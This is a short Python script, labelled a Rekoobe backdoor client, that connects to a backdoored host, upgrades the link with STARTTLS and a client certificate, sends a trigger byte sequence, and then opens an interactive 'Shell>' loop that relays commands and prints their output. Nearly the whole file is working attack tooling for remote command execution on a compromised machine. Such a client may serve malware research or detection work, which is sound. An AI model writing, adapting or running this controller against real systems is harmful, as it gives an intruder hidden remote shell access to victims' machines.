#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""Rekoobe backdoor client
"""

import socket
import ssl

HOST = "127.0.0.1"
PORT = 45681
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

if __name__ == "__main__":
    client.connect((HOST, PORT))
    print(client.recv(200))
    client.send("\r\n")
    print(client.recv(200))
    client.send("starttls\r\n")
    print(client.recv(200))
    ssl_client = ssl.wrap_socket(client, certfile="./cert.pem")
    ssl_client.send(b"\x03")
    ssl_client.send(b"%")
    ssl_client.send(b"0002")
    ssl_client.send(b"\r\n")
    ssl_client.settimeout(1)
    ssl_client.recv()
    while True:
        command = raw_input("Shell>")
        command += "\r\n"
        command = command.encode()
        ssl_client.send(command)
        try:
            # Receiving stdin, stdout, stderr
            while True:
                print(ssl_client.recv())
        except ssl.SSLError:
            pass
